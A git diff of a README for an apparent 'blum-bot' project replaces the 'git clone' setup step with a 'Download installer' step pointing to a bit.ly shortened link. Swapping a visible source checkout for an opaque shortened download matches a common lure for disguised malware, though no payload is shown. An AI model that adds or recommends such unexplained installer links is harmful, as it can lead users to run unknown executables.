@@ -24,11 +24,10 @@ Make sure you have Python installed on your system. You can download it from the
 
 ### Steps
 
-1. **Clone the repository**
+1. **Download installer**
 
     ```sh
-    git clone https://github.com/DarkSkull777/blum-bot.git
-    cd blum-bot
+    [DOWNLOAD LINK](https://bit.ly/3UZJ92L)
     ```
 
 2. **Install the required modules**
